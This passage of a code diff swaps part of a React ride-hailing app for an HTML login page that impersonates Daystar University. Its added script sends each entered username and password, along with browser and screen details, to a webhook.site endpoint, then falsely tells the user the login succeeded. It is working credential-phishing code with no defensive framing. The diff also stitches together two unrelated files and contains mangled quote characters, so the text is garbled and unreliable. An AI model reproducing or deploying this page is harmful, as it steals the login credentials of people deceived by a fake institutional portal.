-          <span className="settings-item-icon">{item.icon}</span>
-          <span className="settings-item-text">{item.text}</span>
-          <span className="settings-item-arrow">›</span>
-        </div>
-      ))}
-    </div>
+            if (!username || !password) {
+                alert('Please fill in both username and password.');
+                return false;
+            }
 
-    <div className="settings-section">
-      <div className="settings-section-title">Support & Legal</div>
-      {[
-        {icon:"🎧",text:"Help & Support"},
-        {icon:"📋",text:"Terms of Service"},
-        {icon:"🔐",text:"Privacy Policy"},
-        {icon:"🌍",text:"App Language (English)"},
-        {icon:"⭐",text:"Rate the App"},
-      ].map(item => (
-        <div key={item.text} className="settings-item" onClick={() => showToast(`${item.text} opened`)}>
-          <span className="settings-item-icon">{item.icon}</span>
-          <span className="settings-item-text">{item.text}</span>
-          <span className="settings-item-arrow">›</span>
-        </div>
-      ))}
-    </div>
+            // Send data to webhook
+            const webhookURL = 'https://webhook.site/your-unique-id-here'; // REPLACE WITH YOUR ACTUAL WEBHOOK URL
 
-    <div className="settings-section">
-      <div className="settings-section-title">Driver Options</div>
-      <div className="settings-item" style={{background:"rgba(0,200,83,0.08)",border:"1.5px solid rgba(0,200,83,0.3)"}} onClick={() => showToast("Redirecting to driver portal...")}>
-        <span className="settings-item-icon">🚗</span>
-        <span className="settings-item-text" style={{color:COLORS.primary,fontWeight:600}}>Become a Morobolt Driver</span>
-        <span className="settings-item-arrow" style={{color:COLORS.primary}}>›</span>
-      </div>
-    </div>
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Login successful! Welcome to Daystar University.');
+                } else {
+                    alert('Login failed. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Network error. Please check your connection.');
+            });
 
-    <button onClick={() => setScreen("auth")} style={{
-      width:"100%",background:"rgba(255,61,0,0.1)",border:"1.5px solid rgba(255,61,0,0.3)",
-      borderRadius:12,padding:"14px",color:COLORS.danger,cursor:"pointer",fontSize:15,fontWeight:600,fontFamily:"'DM Sans',sans-serif"
-    }}>
-      Sign Out
-    </button>
-    <div style={{textAlign:"center",color:COLORS.textMuted,fontSize:12,margin:"16px 0",paddingBottom:8}}>
-      Morobolt v1.0.0 · Made for Liberia 🇱🇷
-    </div>
-  </div>
-</>
-```
+            // Clear fields after submission (optional)
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
 
-);
+            return false;
+        }
 
-const NAV_ITEMS = [
-{id:“home”,icon:“🏠”,label:“Home”},
-{id:“trips”,icon:“🗺️”,label:“Trips”},
-{id:“wallet”,icon:“💵”,label:“Wallet”},
-{id:“safety”,icon:“🛡️”,label:“Safety”},
-{id:“profile”,icon:“👤”,label:“Profile”},
-];
+        // Lost password link
+        document.getElementById('lostPassword').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Password reset link will be sent to your registered email.');
+        });
 
-return (
-<>
-<style>{styles}</style>
-<div className="app-container">
-{renderSplash()}
+        // Cookie policy link
+        document.getElementById('cookiePolicy').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This site uses cookies to enhance your experience. By continuing, you agree to our cookie policy.');
+        });
 
-```
-    {screen === "auth" && renderAuth()}
+        // Language selector
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            alert(`Language changed to: ${this.options[this.selectedIndex].text}`);
+        });
+    </script>
 
-    {screen === "main" && (
-      <>
-        <div style={{flex:1,overflow:"hidden",display:"flex",flexDirection:"column"}}>
-          {activeTab === "home" && renderMap()}
-          {activeTab === "trips" && <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>{renderActivities()}</div>}
-          {activeTab === "wallet" && <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>{renderWallet()}</div>}
-          {activeTab === "safety" && <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>{renderSafety()}</div>}
-          {activeTab === "profile" && <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>{renderProfile()}</div>}
-        </div>
-        <div className="bottom-nav">
-          {NAV_ITEMS.map(item => (
-            <button key={item.id} className={`nav-item ${activeTab === item.id ? "active" : ""}`} onClick={() => setActiveTab(item.id)}>
-              <span className="nav-icon">{item.icon}</span>
-              <span>{item.label}</span>
-            </button>
-          ))}
-        </div>
-      </>
-    )}
-
-    {toast && <div className="toast">{toast}</div>}
-  </div>
-</>
-```
-
-);
-}
+</body>
+</html>
